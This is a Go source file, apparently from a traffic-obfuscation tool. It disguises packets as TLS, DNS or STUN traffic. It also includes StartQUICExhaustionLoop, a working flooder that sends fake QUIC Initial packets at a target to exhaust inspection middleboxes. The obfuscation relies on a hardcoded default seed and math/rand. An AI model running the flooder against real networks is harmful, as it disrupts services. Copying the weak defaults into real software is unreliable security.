package crypto

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

// CFGCompiler handles context-free grammar compilation for dynamic protocol layout obfuscation
type CFGCompiler struct {
	seed []byte
}

// NewCFGCompiler creates a new compiler instance with a shared secret seed
func NewCFGCompiler(seed []byte) *CFGCompiler {
	if len(seed) == 0 {
		seed = []byte("default_luminet_cfg_seed_value")
	}
	return &CFGCompiler{seed: seed}
}

// getPRNG returns a deterministic PRNG instance seeded by the shared secret and salt
func (cfg *CFGCompiler) getPRNG(salt []byte) *mrand.Rand {
	h := sha256.New()
	h.Write(cfg.seed)
	h.Write(salt)
	sum := h.Sum(nil)
	seed64 := int64(binary.BigEndian.Uint64(sum[:8]))
	return mrand.New(mrand.NewSource(seed64))
}

// Layout field types
const (
	FieldMagicBytes  = "MagicBytes"
	FieldLengthField = "LengthField"
	FieldFlags       = "Flags"
)

// getLayout returns the field order permutation based on PRNG
func (cfg *CFGCompiler) getLayout(prng *mrand.Rand) []string {
	permutations := [][]string{
		{FieldMagicBytes, FieldLengthField, FieldFlags},
		{FieldMagicBytes, FieldFlags, FieldLengthField},
		{FieldLengthField, FieldMagicBytes, FieldFlags},
		{FieldLengthField, FieldFlags, FieldMagicBytes},
		{FieldFlags, FieldMagicBytes, FieldLengthField},
		{FieldFlags, FieldLengthField, FieldMagicBytes},
	}
	idx := prng.Intn(len(permutations))
	return permutations[idx]
}

// Compile obfuscates a payload according to CFG production rules and mimicry options
func (cfg *CFGCompiler) Compile(payload []byte, mimicType string) ([]byte, error) {
	// 1. Generate random 8-byte salt
	salt := make([]byte, 8)
	if _, err := rand.Read(salt); err != nil {
		return nil, fmt.Errorf("failed to generate salt: %w", err)
	}

	prng := cfg.getPRNG(salt)
	layout := cfg.getLayout(prng)

	// Generate expected check values
	expectedMagic := uint16(prng.Uint32())
	expectedFlags := uint8(prng.Uint32())

	// Write header fields in compiled order
	var headerBuf bytes.Buffer
	for _, field := range layout {
		switch field {
		case FieldMagicBytes:
			buf := make([]byte, 2)
			binary.BigEndian.PutUint16(buf, expectedMagic)
			headerBuf.Write(buf)
		case FieldLengthField:
			buf := make([]byte, 2)
			binary.BigEndian.PutUint16(buf, uint16(len(payload)))
			headerBuf.Write(buf)
		case FieldFlags:
			headerBuf.WriteByte(expectedFlags)
		}
	}

	// Calculate and write padding based on mimicry/entropy-shaping strategy
	padding := cfg.generateMimicPadding(prng, mimicType)

	// Construct overall packet: [Salt (8)] [Header (5)] [Padding (Var)] [Payload (Var)]
	var packet bytes.Buffer
	packet.Write(salt)
	packet.Write(headerBuf.Bytes())
	if len(padding) > 0 {
		packet.Write(padding)
	}
	packet.Write(payload)

	return packet.Bytes(), nil
}

// Decompile parses and de-obfuscates an incoming packet structure
func (cfg *CFGCompiler) Decompile(packet []byte) ([]byte, error) {
	if len(packet) < 13 { // Salt(8) + Header(5) = 13 bytes minimum
		return nil, errors.New("packet too short")
	}

	salt := packet[:8]
	headerData := packet[8:13]

	prng := cfg.getPRNG(salt)
	layout := cfg.getLayout(prng)

	expectedMagic := uint16(prng.Uint32())
	expectedFlags := uint8(prng.Uint32())

	var parsedLength uint16
	var parsedMagic uint16
	var parsedFlags uint8

	offset := 0
	for _, field := range layout {
		switch field {
		case FieldMagicBytes:
			parsedMagic = binary.BigEndian.Uint16(headerData[offset : offset+2])
			offset += 2
		case FieldLengthField:
			parsedLength = binary.BigEndian.Uint16(headerData[offset : offset+2])
			offset += 2
		case FieldFlags:
			parsedFlags = headerData[offset]
			offset++
		}
	}

	// Validate dynamic grammar markers
	if parsedMagic != expectedMagic {
		return nil, fmt.Errorf("invalid dynamic magic bytes: expected 0x%04x, got 0x%04x", expectedMagic, parsedMagic)
	}
	if parsedFlags != expectedFlags {
		return nil, fmt.Errorf("invalid dynamic flags: expected 0x%02x, got 0x%02x", expectedFlags, parsedFlags)
	}

	// Determine payload offset. We must account for the dynamic padding
	totalHeaderLen := 8 + 5 // Salt + Header
	paddingLen := len(packet) - totalHeaderLen - int(parsedLength)
	if paddingLen < 0 {
		return nil, errors.New("corrupted packet length or missing payload data")
	}

	payloadOffset := totalHeaderLen + paddingLen
	return packet[payloadOffset:], nil
}

// generateMimicPadding creates mimicry traffic patterns to shape packet statistical entropy profile
func (cfg *CFGCompiler) generateMimicPadding(prng *mrand.Rand, mimicType string) []byte {
	switch strings.ToLower(mimicType) {
	case "https", "tls":
		// Mimic TLS Handshake records (low entropy headers)
		paddingLen := prng.Intn(32) + 16
		padding := make([]byte, paddingLen)
		padding[0] = 0x16 // Handshake record type
		padding[1] = 0x03 // TLS version major
		padding[2] = 0x01 // TLS version minor (TLS 1.0/1.2/1.3 hello fallback)
		binary.BigEndian.PutUint16(padding[3:5], uint16(paddingLen-5))
		for i := 5; i < paddingLen; i++ {
			padding[i] = byte(prng.Intn(256))
		}
		return padding

	case "dns":
		// Mimic DNS query format header
		padding := make([]byte, 12)
		binary.BigEndian.PutUint16(padding[0:2], uint16(prng.Uint32())) // Trans ID
		binary.BigEndian.PutUint16(padding[2:4], 0x0100)                // Flags: Standard query
		binary.BigEndian.PutUint16(padding[4:6], 0x0001)                // Questions = 1
		binary.BigEndian.PutUint16(padding[6:8], 0x0000)                // Answers = 0
		binary.BigEndian.PutUint16(padding[8:10], 0x0000)               // Authority = 0
		binary.BigEndian.PutUint16(padding[10:12], 0x0000)              // Additional = 0
		return padding

	case "stun":
		// Mimic STUN Binding Request header
		padding := make([]byte, 20)
		binary.BigEndian.PutUint16(padding[0:2], 0x0001) // Binding Request
		binary.BigEndian.PutUint16(padding[2:4], 0x0000) // Message Length (0 attributes)
		binary.BigEndian.PutUint32(padding[4:8], 0x2112A442) // Magic Cookie
		for i := 8; i < 20; i++ {
			padding[i] = byte(prng.Intn(256)) // Transaction ID
		}
		return padding

	default:
		// Light/Default random noise bytes
		paddingLen := prng.Intn(16)
		if paddingLen == 0 {
			return nil
		}
		padding := make([]byte, paddingLen)
		for i := range padding {
			padding[i] = byte(prng.Intn(256))
		}
		return padding
	}
}

// GenerateQUICClientInitial constructs a cryptographically correct-looking QUIC Client Initial packet
func GenerateQUICClientInitial() []byte {
	// Format:
	// - Header Form (1 bit): 1 (Long Header)
	// - Fixed Bit (1 bit): 1
	// - Long Packet Type (2 bits): 0 (Initial)
	// - Reserved Bits (2 bits): Random
	// - Packet Number Length (2 bits): Random (e.g. 1-4 bytes length)
	firstByte := byte(0xc0)

	// Randomize bottom 4 bits (reserved + packet number length)
	randByte := make([]byte, 1)
	_, _ = rand.Read(randByte)
	firstByte |= (randByte[0] & 0x0F)

	// Version: QUIC v1 (0x00000001)
	version := []byte{0x00, 0x00, 0x00, 0x01}

	// Connection IDs (Dest & Src)
	destIDLen := byte(8)
	destID := make([]byte, 8)
	_, _ = rand.Read(destID)

	srcIDLen := byte(8)
	srcID := make([]byte, 8)
	_, _ = rand.Read(srcID)

	// Token: empty (0 length)
	tokenLen := byte(0)

	// Payload details (TLS ClientHello mockup)
	cryptoPayload := []byte{
		0x06, 0x00, 0x00, 0x24, // CRYPTO Frame header
		0x01, 0x00, 0x00, 0x20, // TLS ClientHello header
		0x03, 0x03, // TLS 1.2 Version fallback
	}
	randomRandom := make([]byte, 30) // Random bytes for hello session
	_, _ = rand.Read(randomRandom)
	cryptoPayload = append(cryptoPayload, randomRandom...)

	// Length: payload + packet number (varint encoded)
	// For simplicity, hardcode varint encoding of length
	lengthField := []byte{0x40, byte(len(cryptoPayload) + 2)} // 2 bytes packet number

	packetNumber := []byte{0x00, 0x01}

	var buf bytes.Buffer
	buf.WriteByte(firstByte)
	buf.Write(version)
	buf.WriteByte(destIDLen)
	buf.Write(destID)
	buf.WriteByte(srcIDLen)
	buf.Write(srcID)
	buf.WriteByte(tokenLen)
	buf.Write(lengthField)
	buf.Write(packetNumber)
	buf.Write(cryptoPayload)

	// Pad to 1200 bytes to satisfy QUIC minimum size requirements
	if buf.Len() < 1200 {
		padding := make([]byte, 1200-buf.Len())
		buf.Write(padding)
	}

	return buf.Bytes()
}

// StartQUICExhaustionLoop floods targets with fake QUIC Client Initial packets to exhaust middlebox inspection queue states
func StartQUICExhaustionLoop(ctx context.Context, target string, rate int) error {
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return fmt.Errorf("failed to resolve target address: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to dial target UDP connection: %w", err)
	}
	defer conn.Close()

	if rate <= 0 {
		rate = 100 // Default packets per second
	}
	interval := time.Second / time.Duration(rate)
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-ticker.C:
			pkt := GenerateQUICClientInitial()
			_, _ = conn.Write(pkt)
		}
	}
}

// CFGConn wraps a net.Conn to apply CFG dynamic layout obfuscation.
type CFGConn struct {
	net.Conn
	compiler *CFGCompiler
	mimic    string
	reader   *bufio.Reader
	readBuf  bytes.Buffer
	readMu   sync.Mutex
	writeMu  sync.Mutex
}

// NewCFGConn creates a new CFGConn.
func NewCFGConn(conn net.Conn, seed []byte, mimic string) net.Conn {
	return &CFGConn{
		Conn:     conn,
		compiler: NewCFGCompiler(seed),
		mimic:    mimic,
		reader:   bufio.NewReader(conn),
	}
}

func (c *CFGConn) Write(b []byte) (int, error) {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()

	frame, err := c.compiler.Compile(b, c.mimic)
	if err != nil {
		return 0, err
	}

	length := uint16(len(frame))
	lengthBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBuf, length)

	if _, err := c.Conn.Write(lengthBuf); err != nil {
		return 0, err
	}
	if _, err := c.Conn.Write(frame); err != nil {
		return 0, err
	}

	return len(b), nil
}

func (c *CFGConn) Read(b []byte) (int, error) {
	c.readMu.Lock()
	defer c.readMu.Unlock()

	if c.readBuf.Len() > 0 {
		return c.readBuf.Read(b)
	}

	lengthBuf := make([]byte, 2)
	if _, err := io.ReadFull(c.reader, lengthBuf); err != nil {
		return 0, err
	}
	length := binary.BigEndian.Uint16(lengthBuf)

	frame := make([]byte, length)
	if _, err := io.ReadFull(c.reader, frame); err != nil {
		return 0, err
	}

	plaintext, err := c.compiler.Decompile(frame)
	if err != nil {
		return 0, err
	}

	c.readBuf.Write(plaintext)
	return c.readBuf.Read(b)
}
